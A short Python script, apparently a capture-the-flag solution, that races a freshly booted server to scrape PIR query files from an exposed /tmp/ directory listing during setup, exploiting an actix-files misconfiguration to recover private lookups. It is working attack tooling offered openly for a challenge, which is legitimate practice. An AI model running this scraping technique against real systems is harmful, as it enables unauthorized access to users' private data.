"""
Scrape the wordlist server's tmp/ directory the moment a fresh instance boots.

actix-files is configured with show_files_listing() + use_hidden_files(), so the
query/response files it writes for every PIR lookup are listed at /tmp/. During
setup the server runs 12 lookups (6 per client) over ~60s while gunicorn is still
preloading, so if you start polling before :8081 comes up you catch all 12 before
the platform wipes them.

Usage: python grab.py <HOST>
Run it the instant the new address appears. Stop (Ctrl+C) once queries stops
growing (want 12 -> two keys x six words).
"""
import os, re, sys, time, urllib.request

host = sys.argv[1]
wl = f"http://{host}:8080"
web = f"http://{host}:8081"
os.makedirs("grab_dump", exist_ok=True)

seen = set()
web_up = False
start = time.time()
polls = 0

def is_web_up():
    try:
        urllib.request.urlopen(web + "/", timeout=1)
        return True
    except urllib.error.HTTPError:
        return True
    except Exception:
        return False

print(f"[*] watching {wl}/tmp/  (web-up marks the end of the setup window)")
while True:
    polls += 1
    try:
        with urllib.request.urlopen(wl + "/tmp/", timeout=2) as r:
            html = r.read().decode(errors="replace")
        for f in re.findall(r'href="([^"]+)"', html):
            name = f.split("/")[-1]
            if not name.endswith(".query") or name in seen:
                continue
            try:
                with urllib.request.urlopen(wl + "/tmp/" + name, timeout=6) as r:
                    open("grab_dump/" + name, "wb").write(r.read())
                seen.add(name)
                print(f"[{time.time()-start:6.2f}s] got {name}  queries={len(seen)}")
            except Exception as e:
                print("  download failed", name, e)
    except Exception:
        pass

    if not web_up and polls % 10 == 0 and is_web_up():
        web_up = True
        print(f"[{time.time()-start:6.1f}s] --- :8081 is up (setup finished) ---")
    if polls % 50 == 0:
        print(f"[{time.time()-start:6.1f}s] polling... web_up={web_up} queries={len(seen)}")
    time.sleep(0.03)
